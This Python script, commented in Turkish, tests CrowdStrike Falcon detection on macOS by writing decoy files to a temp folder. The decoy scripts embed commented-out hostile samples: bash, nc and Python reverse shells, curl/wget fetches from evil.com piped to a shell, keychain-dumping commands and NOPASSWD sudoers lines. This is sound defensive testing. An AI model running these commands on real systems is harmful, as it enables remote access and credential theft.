#!/usr/bin/env python3
"""
CrowdStrike Falcon Detection Tests for macOS
Python Edition

Bu script CrowdStrike Falcon EDR'ın macOS endpoint'lerde tespitlerini doğrulamak 
için güvenli testler yapar.
SADECE TEST ORTAMINDA KULLANIN!

Kullanım: sudo python3 crowdstrike_test_macos.py
"""

import os
import sys
import time
import tempfile
import shutil
import subprocess
import platform
from datetime import datetime
from pathlib import Path

class Colors:
    """Terminal renkleri"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class CrowdStrikeMacTester:
    def __init__(self):
        self.test_count = 0
        self.detected_count = 0
        self.log_file = os.path.join(
            tempfile.gettempdir(),
            f"CrowdStrikeTest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        )
        
    def log(self, message, level="INFO"):
        """Log mesajı yaz"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        color_map = {
            "INFO": Colors.CYAN,
            "SUCCESS": Colors.GREEN,
            "WARNING": Colors.YELLOW,
            "ERROR": Colors.RED
        }
        
        color = color_map.get(level, Colors.END)
        print(f"{color}{log_entry}{Colors.END}")
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')
    
    def check_root(self):
        """Root yetkisi kontrolü"""
        if os.geteuid() != 0:
            print(f"\n{Colors.RED}Bu script root yetkileriyle çalıştırılmalıdır!{Colors.END}")
            print(f"{Colors.YELLOW}Kullanım: sudo python3 {sys.argv[0]}{Colors.END}\n")
            sys.exit(1)
    
    def check_macos(self):
        """macOS kontrolü"""
        if platform.system() != 'Darwin':
            print(f"\n{Colors.RED}Bu script macOS için tasarlanmıştır!{Colors.END}")
            print(f"Mevcut sistem: {platform.system()}\n")
            sys.exit(1)
    
    def check_falcon_sensor(self):
        """CrowdStrike Falcon Sensor kontrolü"""
        self.log("CrowdStrike Falcon Sensor kontrolü yapılıyor...", "INFO")
        
        # falcond process kontrolü
        try:
            result = subprocess.run(
                ['pgrep', '-x', 'falcond'],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                self.log("CrowdStrike Falcon Sensor çalışıyor (falcond process aktif)", "SUCCESS")
                return True
        except:
            pass
        
        # System extension kontrolü
        try:
            result = subprocess.run(
                ['systemextensionsctl', 'list'],
                capture_output=True,
                text=True
            )
            
            if 'com.crowdstrike' in result.stdout:
                self.log("CrowdStrike System Extension yüklü", "SUCCESS")
                
                # CrowdStrike process kontrolü
                result = subprocess.run(
                    ['pgrep', '-f', 'CrowdStrike'],
                    capture_output=True,
                    text=True
                )
                
                if result.returncode == 0:
                    self.log("CrowdStrike process'leri aktif", "SUCCESS")
                    return True
                else:
                    self.log("CrowdStrike extension yüklü ama process aktif değil", "WARNING")
                    return False
        except:
            pass
        
        self.log("CrowdStrike Falcon Sensor bulunamadı!", "ERROR")
        return False
    
    def print_banner(self):
        """Banner yazdır"""
        os.system('clear')
        print("\n" + "=" * 70)
        print(f"{Colors.CYAN}  CROWDSTRIKE FALCON DETECTION TEST SUITE - macOS{Colors.END}")
        print(f"{Colors.YELLOW}  Python Edition - Safe Detection Tests{Colors.END}")
        print("=" * 70 + "\n")
        
    def test_eicar(self):
        """Test 1: EICAR standart test dosyası"""
        self.test_count += 1
        print(f"\n[{self.test_count}] EICAR Standart Test Dosyası")
        self.log("EICAR test dosyası oluşturuluyor...", "INFO")
        
        try:
            eicar_string = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
            eicar_path = os.path.join(tempfile.gettempdir(), 'eicar_test.com')
            
            with open(eicar_path, 'w') as f:
                f.write(eicar_string)
            
            time.sleep(3)
            
            if os.path.exists(eicar_path):
                self.log("UYARI: EICAR dosyası tespit EDİLMEDİ!", "WARNING")
                try:
                    os.remove(eicar_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: EICAR dosyası tespit edildi ve karantinaya alındı", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: EICAR yazma girişimi engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_suspicious_shell_script(self):
        """Test 2: Şüpheli shell script"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Şüpheli Shell Script Tespiti")
        self.log("Şüpheli shell script test ediliyor...", "INFO")
        
        try:
            script_content = """#!/bin/bash
# SADECE TEST - Bu script gerçekte çalıştırılmaz
# CrowdStrike behavioral detection'ını test eder

# Reverse shell pattern (not executed):
# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
# nc -e /bin/bash attacker.com 4444

# Suspicious commands (commented):
# curl http://malicious.com/payload.sh | bash
# wget -O - http://evil.com/script | sh

echo "Bu sadece bir test - gerçek execution yok"
"""
            
            script_path = os.path.join(tempfile.gettempdir(), 'suspicious_script.sh')
            
            with open(script_path, 'w') as f:
                f.write(script_content)
            
            os.chmod(script_path, 0o755)
            time.sleep(3)
            
            if os.path.exists(script_path):
                self.log("INFO: Script dosyası oluşturuldu (execution-based detection bekleniyor)", "INFO")
                try:
                    os.remove(script_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Şüpheli script tespit edildi ve engellendi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Script yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_keychain_access(self):
        """Test 3: Keychain access pattern"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Credential Access IOA - Keychain Pattern")
        self.log("Keychain access pattern test ediliyor...", "INFO")
        
        try:
            keychain_script = """#!/bin/bash
# SADECE TEST - Bu gerçek keychain dumping değildir
# CrowdStrike Credential Access IOA'sını test eder

# Keychain dumping commands (not executed):
# security dump-keychain -d login.keychain
# security find-generic-password -wa "password"
# security dump-trust-settings

echo "Keychain Access IOA Test - No actual dumping"
"""
            
            script_path = os.path.join(tempfile.gettempdir(), 'keychain_dump_test.sh')
            
            with open(script_path, 'w') as f:
                f.write(keychain_script)
            
            os.chmod(script_path, 0o755)
            time.sleep(3)
            
            if os.path.exists(script_path):
                self.log("INFO: Static keychain pattern tespiti aktif değil (execution-based)", "INFO")
                try:
                    os.remove(script_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Keychain access pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_launchagent_persistence(self):
        """Test 4: LaunchAgent persistence"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Persistence IOA - LaunchAgent Creation")
        self.log("LaunchAgent persistence pattern test ediliyor...", "INFO")
        
        try:
            plist_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.test.crowdstrike</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>echo "Test LaunchAgent - Not malicious"</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
            
            plist_path = os.path.join(tempfile.gettempdir(), 'com.test.crowdstrike.plist')
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            time.sleep(3)
            
            if os.path.exists(plist_path):
                self.log("INFO: LaunchAgent file oluşturuldu (/tmp klasöründe - normal lokasyon değil)", "INFO")
                try:
                    os.remove(plist_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Suspicious LaunchAgent tespit edildi", "SUCCESS")
                self.detected_count += 1
            
            self.log("INFO: Not: Gerçek ~/Library/LaunchAgents/ yazma testi yapılmadı (sistem güvenliği için)", "INFO")
            
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_ransomware_behavior(self):
        """Test 5: Ransomware behavior"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Machine Learning IOA - Ransomware Behavior")
        self.log("Hızlı dosya oluşturma pattern test ediliyor...", "INFO")
        
        try:
            test_folder = os.path.join(tempfile.gettempdir(), 'rapid_file_test_cs_macos')
            os.makedirs(test_folder, exist_ok=True)
            
            files_created = 0
            file_extensions = ['.doc', '.xls', '.pdf', '.txt', '.jpg', '.png']
            
            for i in range(50):
                try:
                    ext = file_extensions[i % len(file_extensions)]
                    file_path = os.path.join(test_folder, f'document_{i}{ext}')
                    
                    with open(file_path, 'w') as f:
                        f.write(f'Original content {i} - {datetime.now().timestamp()}')
                    
                    files_created += 1
                    time.sleep(0.05)
                except:
                    break
            
            time.sleep(3)
            
            if files_created >= 45:
                self.log(f"INFO: Ransomware behavioral pattern engellemedi ({files_created}/50)", "INFO")
            else:
                self.log(f"BAŞARILI: Ransomware behavior tespit edildi ve engellendi ({files_created}/50)", "SUCCESS")
                self.detected_count += 1
            
            try:
                shutil.rmtree(test_folder)
            except:
                pass
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya işlemi engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_python_reverse_shell(self):
        """Test 6: Python reverse shell pattern"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Execution IOA - Python Reverse Shell Pattern")
        self.log("Python reverse shell pattern test ediliyor...", "INFO")
        
        try:
            python_script = '''#!/usr/bin/env python3
"""
SADECE TEST - Bu script çalıştırılmaz
CrowdStrike Python execution IOA'sını test eder

Reverse shell pattern (commented out):
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

Test purpose only - no actual connection
"""

print("Python Reverse Shell Test - No actual execution")
'''
            
            script_path = os.path.join(tempfile.gettempdir(), 'reverse_shell_test.py')
            
            with open(script_path, 'w') as f:
                f.write(python_script)
            
            os.chmod(script_path, 0o755)
            time.sleep(3)
            
            if os.path.exists(script_path):
                self.log("INFO: Python script file tespiti aktif değil (runtime detection)", "INFO")
                try:
                    os.remove(script_path)
                except:
                    pass
            else:
                self.log("BAŞARILI: Python reverse shell pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
                
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def test_privilege_escalation(self):
        """Test 7: Privilege escalation pattern"""
        self.test_count += 1
        print(f"\n[{self.test_count}] Privilege Escalation IOA - Sudoers Pattern")
        self.log("Privilege escalation pattern test ediliyor...", "INFO")
        
        try:
            sudoers_content = """# SADECE TEST - Bu gerçek sudoers değişikliği değildir
# CrowdStrike Privilege Escalation IOA'sını test eder

# Dangerous sudoers entries (not applied):
# testuser ALL=(ALL) NOPASSWD: ALL
# %admin ALL=(ALL) NOPASSWD: /bin/bash

Test file for privilege escalation detection
"""
            
            test_sudoers = os.path.join(tempfile.gettempdir(), 'test_sudoers')
            
            with open(test_sudoers, 'w') as f:
                f.write(sudoers_content)
            
            time.sleep(3)
            
            if os.path.exists(test_sudoers):
                self.log("INFO: Test sudoers file oluşturuldu (/tmp'de - gerçek /etc/sudoers değil)", "INFO")
                try:
                    os.remove(test_sudoers)
                except:
                    pass
            else:
                self.log("BAŞARILI: Sudoers modification pattern tespit edildi", "SUCCESS")
                self.detected_count += 1
            
            self.log("INFO: Not: Gerçek /etc/sudoers yazma testi yapılmadı (sistem güvenliği için)", "INFO")
            
        except Exception as e:
            self.log(f"BAŞARILI: Dosya yazma engellendi - {str(e)}", "SUCCESS")
            self.detected_count += 1
    
    def check_sensor_status(self):
        """Falcon sensor status"""
        print("\n" + "=" * 70)
        print(f"{Colors.CYAN}  FALCON SENSOR STATUS - macOS{Colors.END}")
        print("=" * 70 + "\n")
        
        # Process kontrolü
        print(f"{Colors.BOLD}Falcon Process Status:{Colors.END}")
        try:
            result = subprocess.run(['pgrep', '-x', 'falcond'], capture_output=True)
            if result.returncode == 0:
                print(f"  falcond: {Colors.GREEN}Running{Colors.END}")
            else:
                print(f"  falcond: {Colors.RED}Not Running{Colors.END}")
        except:
            print("  falcond: Status unknown")
        
        # System extension
        print(f"\n{Colors.BOLD}System Extension Status:{Colors.END}")
        try:
            result = subprocess.run(['systemextensionsctl', 'list'], capture_output=True, text=True)
            if 'com.crowdstrike' in result.stdout:
                print(f"  CrowdStrike Extension: {Colors.GREEN}Loaded{Colors.END}")
            else:
                print(f"  CrowdStrike Extension: {Colors.RED}Not Loaded{Colors.END}")
        except:
            print("  System Extension: Status unknown")
        
        print()
    
    def print_results(self):
        """Sonuçları yazdır"""
        print("\n" + "=" * 70)
        print(f"{Colors.CYAN}  TEST SONUÇLARI{Colors.END}")
        print("=" * 70 + "\n")
        
        detection_rate = (self.detected_count / self.test_count * 100) if self.test_count > 0 else 0
        
        print(f"Toplam Test: {Colors.BOLD}{self.test_count}{Colors.END}")
        print(f"Tespit Edilen: {Colors.GREEN}{self.detected_count}{Colors.END}")
        
        rate_color = Colors.GREEN if detection_rate >= 75 else Colors.YELLOW if detection_rate >= 50 else Colors.RED
        print(f"Tespit Oranı: {rate_color}{detection_rate:.2f}%{Colors.END}\n")
        
        print(f"{Colors.YELLOW}CROWDSTRIKE DETECTION ANALİZİ (macOS):{Colors.END}\n")
        
        if detection_rate >= 20:
            self.log("SONUÇ: CrowdStrike Falcon çalışıyor - EDR tespitleri aktif", "SUCCESS")
            print(f"\n{Colors.CYAN}Not: CrowdStrike birçok davranışı ENGELLEME yerine LOGLAMA modunda çalışır.{Colors.END}")
            print(f"{Colors.CYAN}Düşük tespit oranı NORMAL olabilir. Önemli olan:{Colors.END}")
            print("  1. Falcon Console'da event'lerin görünmesi")
            print("  2. Detection'ların loglanması")
            print("  3. Prevention policy'ye göre aksiyonlar")
        elif detection_rate >= 10:
            self.log("SONUÇ: CrowdStrike Falcon aktif ama detection mode'da", "WARNING")
            print(f"\n{Colors.YELLOW}Prevention policy kontrol edin - sadece detection mode olabilir{Colors.END}")
        else:
            self.log("SONUÇ: CrowdStrike Falcon tespiti çok düşük - inceleme gerekli", "ERROR")
            print(f"\n{Colors.RED}Olası sorunlar:{Colors.END}")
            print("  - Sensor tam bağlanmamış olabilir")
            print("  - Full Disk Access izni verilmemiş olabilir")
            print("  - Prevention policy aktif değil")
            print("  - System Extension onaylanmamış olabilir")
        
        print(f"\nDetaylı log: {self.log_file}")
        print(f"\n{Colors.YELLOW}macOS'a ÖZEL KONTROLLER:{Colors.END}")
        print("1. System Preferences → Security & Privacy → Privacy → Full Disk Access")
        print("   → CrowdStrike Falcon'un tick'i olmalı")
        print("2. System Preferences → Security & Privacy → General")
        print("   → System Extension onaylandı mı?")
        print("3. Terminal: sudo /Applications/Falcon.app/Contents/Resources/falconctl stats")
        print("\n" + "=" * 70 + "\n")

def main():
    """Ana fonksiyon"""
    tester = CrowdStrikeMacTester()
    
    # Kontroller
    tester.check_macos()
    tester.check_root()
    
    tester.print_banner()
    tester.log("Test başlatılıyor...", "INFO")
    tester.log(f"Log dosyası: {tester.log_file}", "INFO")
    tester.log(f"Hostname: {platform.node()}", "INFO")
    
    # Sensor kontrolü
    if not tester.check_falcon_sensor():
        print(f"\n{Colors.RED}HATA: CrowdStrike Falcon Sensor aktif değil!{Colors.END}")
        print(f"{Colors.YELLOW}Lütfen sensor'ü kontrol edin.{Colors.END}\n")
        response = input("Devam etmek istiyor musunuz? (y/n): ")
        if response.lower() != 'y':
            sys.exit(1)
    
    print()
    
    # Testleri çalıştır
    tester.test_eicar()
    tester.test_suspicious_shell_script()
    tester.test_keychain_access()
    tester.test_launchagent_persistence()
    tester.test_ransomware_behavior()
    tester.test_python_reverse_shell()
    tester.test_privilege_escalation()
    
    # Sensor status
    tester.check_sensor_status()
    
    # Sonuçları göster
    tester.print_results()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Test kullanıcı tarafından iptal edildi.{Colors.END}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Hata oluştu: {str(e)}{Colors.END}\n")
        sys.exit(1)
